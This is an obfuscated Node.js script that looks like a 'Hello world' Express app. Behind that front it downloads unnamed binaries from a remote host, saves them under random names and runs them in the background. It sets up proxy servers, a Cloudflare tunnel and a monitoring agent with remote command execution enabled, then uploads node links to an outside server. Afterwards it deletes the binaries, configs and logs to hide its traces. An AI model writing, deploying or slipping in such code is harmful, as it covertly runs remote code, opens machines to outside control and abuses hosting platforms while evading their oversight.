const _0x4a707c=_0x3c7e;(function(_0x3e019f,_0x443fef){const _0x16df1e=_0x3c7e,_0x4a062a=_0x3e019f();while(!![]){try{const _0x5f1ac7=-parseInt(_0x16df1e(0x1f9))/0x1+parseInt(_0x16df1e(0x184))/0x2+parseInt(_0x16df1e(0x1fc))/0x3*(-parseInt(_0x16df1e(0x1dd))/0x4)+-parseInt(_0x16df1e(0x1dc))/0x5*(-parseInt(_0x16df1e(0x20d))/0x6)+-parseInt(_0x16df1e(0x1e8))/0x7+parseInt(_0x16df1e(0x197))/0x8*(-parseInt(_0x16df1e(0x15f))/0x9)+parseInt(_0x16df1e(0x153))/0xa*(parseInt(_0x16df1e(0x1d4))/0xb);if(_0x5f1ac7===_0x443fef)break;else _0x4a062a['push'](_0x4a062a['shift']());}catch(_0x11a7d1){_0x4a062a['push'](_0x4a062a['shift']());}}}(_0x2a60,0xa9664));const express=require(_0x4a707c(0x1ea)),app=express(),axios=require(_0x4a707c(0x15e)),os=require('os'),fs=require('fs'),path=require(_0x4a707c(0x16f)),{promisify}=require(_0x4a707c(0x199)),exec=promisify(require(_0x4a707c(0x1d7))[_0x4a707c(0x157)]),{execSync}=require(_0x4a707c(0x1d7)),UPLOAD_URL=process[_0x4a707c(0x1d0)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x4a707c(0x1d0)][_0x4a707c(0x176)]||'',AUTO_ACCESS=process['env'][_0x4a707c(0x196)]||![],FILE_PATH=process['env']['FILE_PATH']||_0x4a707c(0x1b4),SUB_PATH=process[_0x4a707c(0x1d0)][_0x4a707c(0x187)]||_0x4a707c(0x1a1),PORT=process['env']['SERVER_PORT']||process[_0x4a707c(0x1d0)][_0x4a707c(0x1db)]||0xbb8,UUID=process[_0x4a707c(0x1d0)][_0x4a707c(0x1ba)]||'5a5c292e-7663-4f99-b094-28d8f5f98ac3',NEZHA_SERVER=process[_0x4a707c(0x1d0)][_0x4a707c(0x163)]||'',NEZHA_PORT=process['env'][_0x4a707c(0x1cf)]||'',NEZHA_KEY=process[_0x4a707c(0x1d0)][_0x4a707c(0x1a2)]||'',ARGO_DOMAIN=process[_0x4a707c(0x1d0)][_0x4a707c(0x16b)]||'',ARGO_AUTH=process[_0x4a707c(0x1d0)][_0x4a707c(0x1b0)]||'',ARGO_PORT=process[_0x4a707c(0x1d0)][_0x4a707c(0x211)]||0x1f41,CFIP=process[_0x4a707c(0x1d0)][_0x4a707c(0x1c8)]||'cdns.doon.eu.org',CFPORT=process[_0x4a707c(0x1d0)][_0x4a707c(0x18f)]||0x1bb,NAME=process[_0x4a707c(0x1d0)][_0x4a707c(0x1f0)]||'';!fs['existsSync'](FILE_PATH)?(fs[_0x4a707c(0x206)](FILE_PATH),console[_0x4a707c(0x1a4)](FILE_PATH+_0x4a707c(0x1ee))):console[_0x4a707c(0x1a4)](FILE_PATH+_0x4a707c(0x1b2));function generateRandomName(){const _0x2e4ee6=_0x4a707c,_0x4b53a3=_0x2e4ee6(0x1a6);let _0x5d13eb='';for(let _0x209163=0x0;_0x209163<0x6;_0x209163++){_0x5d13eb+=_0x4b53a3[_0x2e4ee6(0x1ae)](Math[_0x2e4ee6(0x1cb)](Math[_0x2e4ee6(0x1d5)]()*_0x4b53a3[_0x2e4ee6(0x178)]));}return _0x5d13eb;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x4a707c(0x210)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x4a707c(0x210)](FILE_PATH,webName),botPath=path[_0x4a707c(0x210)](FILE_PATH,botName),subPath=path[_0x4a707c(0x210)](FILE_PATH,'sub.txt'),listPath=path[_0x4a707c(0x210)](FILE_PATH,_0x4a707c(0x1a3)),bootLogPath=path[_0x4a707c(0x210)](FILE_PATH,_0x4a707c(0x1a7)),configPath=path[_0x4a707c(0x210)](FILE_PATH,_0x4a707c(0x166));function deleteNodes(){const _0x45955c=_0x4a707c;try{if(!UPLOAD_URL)return;if(!fs[_0x45955c(0x15d)](subPath))return;let _0x111eff;try{_0x111eff=fs[_0x45955c(0x1ca)](subPath,_0x45955c(0x179));}catch{return null;}const _0x410ea9=Buffer['from'](_0x111eff,'base64')[_0x45955c(0x1f5)](_0x45955c(0x179)),_0x3f38c6=_0x410ea9[_0x45955c(0x17c)]('\x0a')[_0x45955c(0x1c3)](_0x3f7c9c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x45955c(0x1f2)](_0x3f7c9c));if(_0x3f38c6[_0x45955c(0x178)]===0x0)return;return axios[_0x45955c(0x1c2)](UPLOAD_URL+_0x45955c(0x1c5),JSON[_0x45955c(0x1ac)]({'nodes':_0x3f38c6}),{'headers':{'Content-Type':_0x45955c(0x1e6)}})['catch'](_0x2e1f63=>{return null;}),null;}catch(_0x56e32d){return null;}}function cleanupOldFiles(){const _0x6b6933=_0x4a707c;try{const _0x4df54b=fs[_0x6b6933(0x1ab)](FILE_PATH);_0x4df54b[_0x6b6933(0x1fb)](_0x1a076f=>{const _0x55529f=_0x6b6933,_0x257911=path['join'](FILE_PATH,_0x1a076f);try{const _0x4579e0=fs[_0x55529f(0x1e1)](_0x257911);_0x4579e0[_0x55529f(0x1b3)]()&&fs['unlinkSync'](_0x257911);}catch(_0x286ece){}});}catch(_0x220d0c){}}app['get']('/',function(_0x462f1c,_0x3c2b26){const _0x35f38c=_0x4a707c;_0x3c2b26[_0x35f38c(0x180)](_0x35f38c(0x19b));});async function generateConfig(){const _0x50ecc9=_0x4a707c,_0xfc7e1d={'log':{'access':_0x50ecc9(0x158),'error':_0x50ecc9(0x158),'loglevel':_0x50ecc9(0x204)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x50ecc9(0x17f),'settings':{'clients':[{'id':UUID,'flow':_0x50ecc9(0x1d1)}],'decryption':_0x50ecc9(0x204),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x50ecc9(0x1fe)}},{'port':0xbb9,'listen':_0x50ecc9(0x18e),'protocol':_0x50ecc9(0x17f),'settings':{'clients':[{'id':UUID}],'decryption':_0x50ecc9(0x204)},'streamSettings':{'network':_0x50ecc9(0x1fe),'security':_0x50ecc9(0x204)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x50ecc9(0x17f),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x50ecc9(0x204)},'streamSettings':{'network':'ws','security':_0x50ecc9(0x204),'wsSettings':{'path':_0x50ecc9(0x1b5)}},'sniffing':{'enabled':!![],'destOverride':[_0x50ecc9(0x171),_0x50ecc9(0x162),_0x50ecc9(0x1e0)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x50ecc9(0x18e),'protocol':_0x50ecc9(0x172),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x50ecc9(0x171),_0x50ecc9(0x162),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x50ecc9(0x209),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x50ecc9(0x160)}},'sniffing':{'enabled':!![],'destOverride':[_0x50ecc9(0x171),_0x50ecc9(0x162),_0x50ecc9(0x1e0)],'metadataOnly':![]}}],'dns':{'servers':[_0x50ecc9(0x155)]},'outbounds':[{'protocol':_0x50ecc9(0x190),'tag':_0x50ecc9(0x1ed)},{'protocol':_0x50ecc9(0x1bc),'tag':_0x50ecc9(0x164)}]};fs[_0x50ecc9(0x19d)](path[_0x50ecc9(0x210)](FILE_PATH,_0x50ecc9(0x166)),JSON[_0x50ecc9(0x1ac)](_0xfc7e1d,null,0x2));}function getSystemArchitecture(){const _0x30a238=_0x4a707c,_0x431f05=os[_0x30a238(0x195)]();return _0x431f05===_0x30a238(0x198)||_0x431f05===_0x30a238(0x1d3)||_0x431f05==='aarch64'?_0x30a238(0x198):_0x30a238(0x1ff);}function downloadFile(_0x5f3e94,_0x555bba,_0x1dbf9a){const _0x1cd9c7=_0x4a707c,_0x4cd775=_0x5f3e94;!fs[_0x1cd9c7(0x15d)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x4bd148=fs[_0x1cd9c7(0x1a5)](_0x4cd775);axios({'method':_0x1cd9c7(0x15b),'url':_0x555bba,'responseType':_0x1cd9c7(0x1af)})[_0x1cd9c7(0x20f)](_0x32bd9b=>{const _0x5e7168=_0x1cd9c7;_0x32bd9b[_0x5e7168(0x1be)]['pipe'](_0x4bd148),_0x4bd148['on'](_0x5e7168(0x1eb),()=>{const _0x4f361b=_0x5e7168;_0x4bd148[_0x4f361b(0x20e)](),console['log'](_0x4f361b(0x18b)+path[_0x4f361b(0x20b)](_0x4cd775)+'\x20successfully'),_0x1dbf9a(null,_0x4cd775);}),_0x4bd148['on']('error',_0x53997f=>{const _0x3a42cc=_0x5e7168;fs[_0x3a42cc(0x177)](_0x4cd775,()=>{});const _0x7cb605='Download\x20'+path[_0x3a42cc(0x20b)](_0x4cd775)+_0x3a42cc(0x182)+_0x53997f[_0x3a42cc(0x16e)];console['error'](_0x7cb605),_0x1dbf9a(_0x7cb605);});})[_0x1cd9c7(0x17d)](_0x17cad3=>{const _0x3b97ee=_0x1cd9c7,_0x49aa95=_0x3b97ee(0x18b)+path['basename'](_0x4cd775)+'\x20failed:\x20'+_0x17cad3['message'];console[_0x3b97ee(0x1c7)](_0x49aa95),_0x1dbf9a(_0x49aa95);});}function _0x2a60(){const _0x3632e0=['base64','mkdirSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','pkill\x20-f\x20\x22[','trojan','substring','basename','npm\x20running\x20error:\x20','42hBSWAY','close','then','join','ARGO_PORT','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','8443','https://arm64.ssss.nyc.mn/web','set','has','20txATTZ','del\x20/f\x20/q\x20','https+local://8.8.8.8/dns-query','clear','exec','/dev/null','all','response','get','Subscription\x20uploaded\x20successfully','existsSync','axios','72olgISk','/trojan-argo','&fp=firefox&type=ws&host=','tls','NEZHA_SERVER','block','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','config.json','?security=tls&sni=','/tunnel.yml\x20run','fileUrl','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','ARGO_DOMAIN','443','\x0a\x20\x20\x0avmess://','message','path','match','http','vmess','config.yaml','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','false','PROJECT_URL','unlink','length','utf-8','listen','/sub.txt\x20saved\x20successfully','split','catch','\x20is\x20running','vless','send','\x20-s\x20','\x20failed:\x20','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','2578386HgiiZI','&path=%2Fvless-argo%3Fed%3D2560#','/config.json\x20>/dev/null\x202>&1\x20&','SUB_PATH','chmod','rm\x20-rf\x20','https://arm64.ssss.nyc.mn/bot','Download\x20','/api/add-nodes','includes','127.0.0.1','CFPORT','freedom','status','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','web\x20running\x20error:\x20','--tls','arch','AUTO_ACCESS','203768IVETHz','arm','util','2087','Hello\x20world!','https://amd64.ssss.nyc.mn/v1','writeFileSync','?encryption=none&security=tls&sni=','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','Empowerment\x20failed\x20for\x20','sub','NEZHA_KEY','list.txt','log','createWriteStream','abcdefghijklmnopqrstuvwxyz','boot.log','\x0a\x20\x20\x0atrojan://','Add\x20automatic\x20access\x20task\x20faild:\x20','win32','readdirSync','stringify','2096','charAt','stream','ARGO_AUTH','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x20already\x20exists','isFile','./tmp','/vless-argo','true','https://oooo.serv00.net/add-url','\x22\x20>\x20/dev/null\x202>&1','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','UUID','2053','blackhole','\x0a\x20\x20credentials-file:\x20','data','nohup\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','tunnel.json','post','filter','https://amd64.ssss.nyc.mn/web','/api/delete-nodes','Error\x20downloading\x20files:','error','CFIP','App\x20is\x20running','readFileSync','floor','2083','NEZHA\x20variable\x20is\x20empty,skip\x20running','Nodes\x20uploaded\x20successfully','NEZHA_PORT','env','xtls-rprx-vision','push','arm64','10211773jCFUhT','random','http\x20server\x20is\x20running\x20on\x20port:','child_process','/vmess-argo?ed=2560','trim','from','PORT','361135KXZMWI','2071196nFQQxt','&path=%2Ftrojan-argo%3Fed%3D2560#','tunnel.yml','quic','statSync','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x20-p\x20','/api/add-subscriptions','\x20>\x20nul\x202>&1','application/json','taskkill\x20/f\x20/im\x20','5939066qiqsVV','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','express','finish','fileName','direct','\x20is\x20created','platform','NAME','php\x20running\x20error:\x20','test','text/plain;\x20charset=utf-8','\x20-c\x20','toString','https://amd64.ssss.nyc.mn/bot','unshift','\x0aclient_secret:\x20','1387603KXcktu','Error\x20in\x20startserver:','forEach','3FULYqD','Error\x20executing\x20command:\x20','tcp','amd','https://arm64.ssss.nyc.mn/agent','\x0a\x20\x20\x20\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','Content-Type','none'];_0x2a60=function(){return _0x3632e0;};return _0x2a60();}async function downloadFilesAndRun(){const _0x58515e=_0x4a707c,_0x36c61c=getSystemArchitecture(),_0x2e44b2=getFilesForArchitecture(_0x36c61c);if(_0x2e44b2[_0x58515e(0x178)]===0x0){console[_0x58515e(0x1a4)](_0x58515e(0x202));return;}const _0x374e71=_0x2e44b2['map'](_0x2c6860=>{return new Promise((_0x52b498,_0x352b20)=>{const _0x45f34c=_0x3c7e;downloadFile(_0x2c6860[_0x45f34c(0x1ec)],_0x2c6860[_0x45f34c(0x169)],(_0x237a7e,_0x4292c6)=>{_0x237a7e?_0x352b20(_0x237a7e):_0x52b498(_0x4292c6);});});});try{await Promise[_0x58515e(0x159)](_0x374e71);}catch(_0x3d3a9a){console['error'](_0x58515e(0x1c6),_0x3d3a9a);return;}function _0x287179(_0x56f750){const _0x1c5a4e=_0x58515e,_0x25a085=0x1fd;_0x56f750[_0x1c5a4e(0x1fb)](_0x38d25a=>{const _0x3c2496=_0x1c5a4e;fs['existsSync'](_0x38d25a)&&fs[_0x3c2496(0x188)](_0x38d25a,_0x25a085,_0x1d03cb=>{const _0x810a38=_0x3c2496;_0x1d03cb?console[_0x810a38(0x1c7)](_0x810a38(0x1a0)+_0x38d25a+':\x20'+_0x1d03cb):console[_0x810a38(0x1a4)]('Empowerment\x20success\x20for\x20'+_0x38d25a+':\x20'+_0x25a085[_0x810a38(0x1f5)](0x8));});});}const _0xdf6580=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x287179(_0xdf6580);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x16055f=NEZHA_SERVER[_0x58515e(0x18d)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x12c9e5=new Set([_0x58515e(0x16c),_0x58515e(0x14f),_0x58515e(0x1ad),_0x58515e(0x19a),_0x58515e(0x1cc),_0x58515e(0x1bb)]),_0x1d4fcd=_0x12c9e5[_0x58515e(0x152)](_0x16055f)?_0x58515e(0x1b6):_0x58515e(0x175),_0x1cd1ea=_0x58515e(0x1f8)+NEZHA_KEY+_0x58515e(0x14e)+NEZHA_SERVER+_0x58515e(0x192)+_0x1d4fcd+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](path['join'](FILE_PATH,_0x58515e(0x173)),_0x1cd1ea);const _0x4218a2=_0x58515e(0x1bf)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x58515e(0x174);try{await exec(_0x4218a2),console['log'](phpName+_0x58515e(0x17e)),await new Promise(_0x47c550=>setTimeout(_0x47c550,0x3e8));}catch(_0x21e7a2){console[_0x58515e(0x1c7)](_0x58515e(0x1f1)+_0x21e7a2);}}else{let _0x3a8208='';const _0x16ecbe=[_0x58515e(0x16c),_0x58515e(0x14f),'2096',_0x58515e(0x19a),_0x58515e(0x1cc),_0x58515e(0x1bb)];_0x16ecbe[_0x58515e(0x18d)](NEZHA_PORT)&&(_0x3a8208=_0x58515e(0x194));const _0xdd428f=_0x58515e(0x1bf)+npmPath+_0x58515e(0x181)+NEZHA_SERVER+':'+NEZHA_PORT+_0x58515e(0x1e3)+NEZHA_KEY+'\x20'+_0x3a8208+_0x58515e(0x1e2);try{await exec(_0xdd428f),console[_0x58515e(0x1a4)](npmName+'\x20is\x20running'),await new Promise(_0x5d51e2=>setTimeout(_0x5d51e2,0x3e8));}catch(_0x36406d){console[_0x58515e(0x1c7)](_0x58515e(0x20c)+_0x36406d);}}}else console[_0x58515e(0x1a4)](_0x58515e(0x1cd));const _0x6ca453=_0x58515e(0x1bf)+webPath+_0x58515e(0x1f4)+FILE_PATH+_0x58515e(0x186);try{await exec(_0x6ca453),console['log'](webName+_0x58515e(0x17e)),await new Promise(_0x2f7640=>setTimeout(_0x2f7640,0x3e8));}catch(_0x3d3088){console['error'](_0x58515e(0x193)+_0x3d3088);}if(fs[_0x58515e(0x15d)](botPath)){let _0x3fc954;if(ARGO_AUTH[_0x58515e(0x170)](/^[A-Z0-9a-z=]{120,250}$/))_0x3fc954=_0x58515e(0x165)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x3fc954='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x58515e(0x168):_0x3fc954='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x58515e(0x1b9)+ARGO_PORT;try{await exec(_0x58515e(0x1bf)+botPath+'\x20'+_0x3fc954+'\x20>/dev/null\x202>&1\x20&'),console[_0x58515e(0x1a4)](botName+'\x20is\x20running'),await new Promise(_0x5f5471=>setTimeout(_0x5f5471,0x7d0));}catch(_0x32afdc){console[_0x58515e(0x1c7)]('Error\x20executing\x20command:\x20'+_0x32afdc);}}await new Promise(_0x34a50d=>setTimeout(_0x34a50d,0x1388));}function getFilesForArchitecture(_0x15eb33){const _0xd9a90=_0x4a707c;let _0x19461a;_0x15eb33==='arm'?_0x19461a=[{'fileName':webPath,'fileUrl':_0xd9a90(0x150)},{'fileName':botPath,'fileUrl':_0xd9a90(0x18a)}]:_0x19461a=[{'fileName':webPath,'fileUrl':_0xd9a90(0x1c4)},{'fileName':botPath,'fileUrl':_0xd9a90(0x1f6)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x10e532=_0x15eb33===_0xd9a90(0x198)?_0xd9a90(0x200):'https://amd64.ssss.nyc.mn/agent';_0x19461a['unshift']({'fileName':npmPath,'fileUrl':_0x10e532});}else{const _0x2ed75f=_0x15eb33===_0xd9a90(0x198)?'https://arm64.ssss.nyc.mn/v1':_0xd9a90(0x19c);_0x19461a[_0xd9a90(0x1f7)]({'fileName':phpPath,'fileUrl':_0x2ed75f});}}return _0x19461a;}function _0x3c7e(_0x57704f,_0x36ed6c){const _0x2a6064=_0x2a60();return _0x3c7e=function(_0x3c7e5a,_0x1b7510){_0x3c7e5a=_0x3c7e5a-0x14e;let _0x4c8cd9=_0x2a6064[_0x3c7e5a];return _0x4c8cd9;},_0x3c7e(_0x57704f,_0x36ed6c);}function argoType(){const _0x4455ca=_0x4a707c;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x4455ca(0x16a));return;}if(ARGO_AUTH[_0x4455ca(0x18d)]('TunnelSecret')){fs['writeFileSync'](path[_0x4455ca(0x210)](FILE_PATH,_0x4455ca(0x1c1)),ARGO_AUTH);const _0xd2130a='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x4455ca(0x17c)]('\x22')[0xb]+_0x4455ca(0x1bd)+path[_0x4455ca(0x210)](FILE_PATH,_0x4455ca(0x1c1))+_0x4455ca(0x1b1)+ARGO_DOMAIN+_0x4455ca(0x1c0)+ARGO_PORT+_0x4455ca(0x19f);fs['writeFileSync'](path[_0x4455ca(0x210)](FILE_PATH,_0x4455ca(0x1df)),_0xd2130a);}else console[_0x4455ca(0x1a4)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x473bad=_0x4a707c;let _0x2bdfc1;if(ARGO_AUTH&&ARGO_DOMAIN)_0x2bdfc1=ARGO_DOMAIN,console[_0x473bad(0x1a4)]('ARGO_DOMAIN:',_0x2bdfc1),await _0x3ee470(_0x2bdfc1);else try{const _0x283190=fs[_0x473bad(0x1ca)](path[_0x473bad(0x210)](FILE_PATH,_0x473bad(0x1a7)),_0x473bad(0x179)),_0x3f9915=_0x283190[_0x473bad(0x17c)]('\x0a'),_0x58b0bc=[];_0x3f9915[_0x473bad(0x1fb)](_0x49a4a9=>{const _0x1a4b31=_0x473bad,_0x23d90e=_0x49a4a9['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x23d90e){const _0x3f86a9=_0x23d90e[0x1];_0x58b0bc[_0x1a4b31(0x1d2)](_0x3f86a9);}});if(_0x58b0bc['length']>0x0)_0x2bdfc1=_0x58b0bc[0x0],console['log']('ArgoDomain:',_0x2bdfc1),await _0x3ee470(_0x2bdfc1);else{console[_0x473bad(0x1a4)](_0x473bad(0x1e9)),fs['unlinkSync'](path[_0x473bad(0x210)](FILE_PATH,_0x473bad(0x1a7)));async function _0x1318bf(){const _0x36b6c1=_0x473bad;try{process[_0x36b6c1(0x1ef)]===_0x36b6c1(0x1aa)?await exec(_0x36b6c1(0x1e7)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x36b6c1(0x208)+botName[_0x36b6c1(0x1ae)](0x0)+']'+botName[_0x36b6c1(0x20a)](0x1)+_0x36b6c1(0x1b8));}catch(_0x1b7449){}}_0x1318bf(),await new Promise(_0x2a674e=>setTimeout(_0x2a674e,0xbb8));const _0x5391cb=_0x473bad(0x207)+FILE_PATH+_0x473bad(0x1b9)+ARGO_PORT;try{await exec(_0x473bad(0x1bf)+botPath+'\x20'+_0x5391cb+'\x20>/dev/null\x202>&1\x20&'),console[_0x473bad(0x1a4)](botName+_0x473bad(0x17e)),await new Promise(_0x1fb941=>setTimeout(_0x1fb941,0xbb8)),await extractDomains();}catch(_0x5c987d){console[_0x473bad(0x1c7)](_0x473bad(0x1fd)+_0x5c987d);}}}catch(_0x2f20b8){console[_0x473bad(0x1c7)]('Error\x20reading\x20boot.log:',_0x2f20b8);}async function _0x3ee470(_0x2eff76){const _0x290998=_0x473bad,_0x150725=execSync(_0x290998(0x183),{'encoding':_0x290998(0x179)}),_0x24d48c=_0x150725[_0x290998(0x1d9)](),_0x39109a=NAME?NAME+'-'+_0x24d48c:_0x24d48c;return new Promise(_0x5de3fb=>{setTimeout(()=>{const _0x328ac5=_0x3c7e,_0x54b2a0={'v':'2','ps':''+_0x39109a,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x328ac5(0x204),'net':'ws','type':_0x328ac5(0x204),'host':_0x2eff76,'path':_0x328ac5(0x1d8),'tls':_0x328ac5(0x162),'sni':_0x2eff76,'alpn':'','fp':'firefox'},_0x593d6a='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x328ac5(0x19e)+_0x2eff76+_0x328ac5(0x161)+_0x2eff76+_0x328ac5(0x185)+_0x39109a+_0x328ac5(0x16d)+Buffer[_0x328ac5(0x1da)](JSON[_0x328ac5(0x1ac)](_0x54b2a0))[_0x328ac5(0x1f5)](_0x328ac5(0x205))+_0x328ac5(0x1a8)+UUID+'@'+CFIP+':'+CFPORT+_0x328ac5(0x167)+_0x2eff76+'&fp=firefox&type=ws&host='+_0x2eff76+_0x328ac5(0x1de)+_0x39109a+_0x328ac5(0x201);console[_0x328ac5(0x1a4)](Buffer[_0x328ac5(0x1da)](_0x593d6a)[_0x328ac5(0x1f5)](_0x328ac5(0x205))),fs[_0x328ac5(0x19d)](subPath,Buffer[_0x328ac5(0x1da)](_0x593d6a)[_0x328ac5(0x1f5)](_0x328ac5(0x205))),console[_0x328ac5(0x1a4)](FILE_PATH+_0x328ac5(0x17b)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x23961e,_0x414c3e)=>{const _0x4c11ac=_0x328ac5,_0x1dffd7=Buffer['from'](_0x593d6a)[_0x4c11ac(0x1f5)](_0x4c11ac(0x205));_0x414c3e[_0x4c11ac(0x151)](_0x4c11ac(0x203),_0x4c11ac(0x1f3)),_0x414c3e[_0x4c11ac(0x180)](_0x1dffd7);}),_0x5de3fb(_0x593d6a);},0x7d0);});}}async function uploadNodes(){const _0x47ffbc=_0x4a707c;if(UPLOAD_URL&&PROJECT_URL){const _0x23bed4=PROJECT_URL+'/'+SUB_PATH,_0x20dd9c={'subscription':[_0x23bed4]};try{const _0x4b79db=await axios[_0x47ffbc(0x1c2)](UPLOAD_URL+_0x47ffbc(0x1e4),_0x20dd9c,{'headers':{'Content-Type':_0x47ffbc(0x1e6)}});return _0x4b79db&&_0x4b79db[_0x47ffbc(0x191)]===0xc8?(console[_0x47ffbc(0x1a4)](_0x47ffbc(0x15c)),_0x4b79db):null;}catch(_0x2fff21){if(_0x2fff21[_0x47ffbc(0x15a)]){if(_0x2fff21[_0x47ffbc(0x15a)][_0x47ffbc(0x191)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x47ffbc(0x15d)](listPath))return;const _0x40a295=fs[_0x47ffbc(0x1ca)](listPath,_0x47ffbc(0x179)),_0x59bb7c=_0x40a295['split']('\x0a')['filter'](_0x2c9d9b=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x47ffbc(0x1f2)](_0x2c9d9b));if(_0x59bb7c[_0x47ffbc(0x178)]===0x0)return;const _0x1a8b0f=JSON['stringify']({'nodes':_0x59bb7c});try{const _0x3be616=await axios[_0x47ffbc(0x1c2)](UPLOAD_URL+_0x47ffbc(0x18c),_0x1a8b0f,{'headers':{'Content-Type':_0x47ffbc(0x1e6)}});return _0x3be616&&_0x3be616[_0x47ffbc(0x191)]===0xc8?(console[_0x47ffbc(0x1a4)](_0x47ffbc(0x1ce)),_0x3be616):null;}catch(_0x3c9836){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x2c2811=_0x3c7e,_0x3909ee=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x3909ee[_0x2c2811(0x1d2)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3909ee[_0x2c2811(0x1d2)](phpPath);process[_0x2c2811(0x1ef)]==='win32'?exec(_0x2c2811(0x154)+_0x3909ee['join']('\x20')+_0x2c2811(0x1e5),_0x412fd8=>{const _0x384313=_0x2c2811;console[_0x384313(0x156)](),console['log'](_0x384313(0x1c9)),console[_0x384313(0x1a4)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x2c2811(0x189)+_0x3909ee['join']('\x20')+'\x20>/dev/null\x202>&1',_0x41cad6=>{const _0x2600b8=_0x2c2811;console['clear'](),console[_0x2600b8(0x1a4)](_0x2600b8(0x1c9)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xa1796d=_0x4a707c;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x5e9d35=await axios['post'](_0xa1796d(0x1b7),{'url':PROJECT_URL},{'headers':{'Content-Type':_0xa1796d(0x1e6)}});return console[_0xa1796d(0x1a4)]('automatic\x20access\x20task\x20added\x20successfully'),_0x5e9d35;}catch(_0x21eb89){return console[_0xa1796d(0x1c7)](_0xa1796d(0x1a9)+_0x21eb89[_0xa1796d(0x16e)]),null;}}async function startserver(){const _0xcb7390=_0x4a707c;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x56e234){console[_0xcb7390(0x1c7)](_0xcb7390(0x1fa),_0x56e234);}}startserver()['catch'](_0x455cbd=>{const _0x17e510=_0x4a707c;console[_0x17e510(0x1c7)]('Unhandled\x20error\x20in\x20startserver:',_0x455cbd);}),app[_0x4a707c(0x17a)](PORT,()=>console[_0x4a707c(0x1a4)](_0x4a707c(0x1d6)+PORT+'!'));
